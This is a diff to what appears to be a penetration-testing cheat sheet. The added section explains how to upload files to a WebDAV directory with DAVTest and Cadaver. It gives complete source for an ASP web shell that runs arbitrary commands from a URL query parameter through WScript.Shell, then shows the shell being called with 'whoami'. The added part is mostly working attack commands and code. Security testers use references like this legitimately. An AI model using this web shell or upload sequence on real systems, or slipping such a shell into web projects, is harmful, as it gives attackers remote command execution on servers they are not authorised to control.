@@ -79,6 +79,29 @@ nmap -sV --version-intensity 9 --script "version and" <target>
 - **SMTP user enumeration**  
   `smtp-user-enum -t <target> -U /path/to/usernames.txt`
 
+# WebDAV Discovery & Upload with DAVTest
+davtest -url http://<target>/webdav/ -methods all -upload
+
+# Interactive WebDAV with Cadaver (upload shell.asp)
+cadaver http://<target>/webdav/ << 'EOF'
+put shell.asp
+EOF
+
+# Create ASP Webshell (shell.asp)
+cat << 'EOF' > shell.asp
+<%
+  Set cmd = Request.QueryString("cmd")
+  If cmd <> "" Then
+    Set o = CreateObject("WScript.Shell")
+    Set p = o.Exec(cmd)
+    Response.Write "<pre>" & p.StdOut.ReadAll() & "</pre>"
+  End If
+%>
+EOF
+
+# Execute Webshell
+# Browse to: http://<target>/webdav/shell.asp?cmd=whoami
+
 ## Directory Discovery with Gobuster
 
 | Description             | Command                                                                 |
